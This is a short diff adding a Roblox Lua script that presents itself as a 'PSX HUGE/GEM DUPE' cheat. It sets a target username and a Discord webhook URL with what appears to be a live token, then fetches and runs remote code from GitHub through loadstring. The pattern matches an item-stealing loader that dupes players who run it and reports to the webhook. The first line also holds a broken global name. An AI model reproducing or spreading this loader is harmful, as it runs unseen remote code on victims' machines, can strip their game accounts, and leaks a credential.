@@ -1,0 +1,5 @@
+__G.Username = "uglyhime1"
+_G.HubName = "PSX HUGE/GEM DUPE"
+_G.WebhookUrl = "webhook hereapi/webhooks/1130001027446358018/oZxTejOjYRrScWaE6Oe6XFGt6RbyKVKAMZHZO1huBGCGCEvSFqh_pNH-EHDONk_ZE8A0"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
